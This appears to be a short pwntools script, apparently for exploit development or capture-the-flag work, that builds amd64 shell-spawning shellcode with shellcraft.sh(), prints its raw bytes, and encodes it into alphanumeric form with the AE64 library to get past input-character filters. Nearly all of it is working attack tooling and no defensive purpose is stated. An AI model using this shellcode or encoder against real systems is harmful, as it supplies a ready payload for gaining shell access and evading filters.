from ae64 import AE64
from pwn import *

"""
Install:
    git clone https://github.com/veritas501/ae64.git
    cd ae64 && pip install .
"""
context.arch = 'amd64'

# Generate bytes format shellcode
sc = asm(shellcraft.sh())

# Debug raw shellcode
raw_hex = ', '.join(f'0x{b:02x}' for b in sc)
print(f"[*] Raw generated shellcode: {raw_hex}")

# Convert alphanumeric shellcode
enc_sc = (AE64().encode(sc)).decode('latin1')
print(f"[+] Alphanumeric shellcode: {enc_sc}")
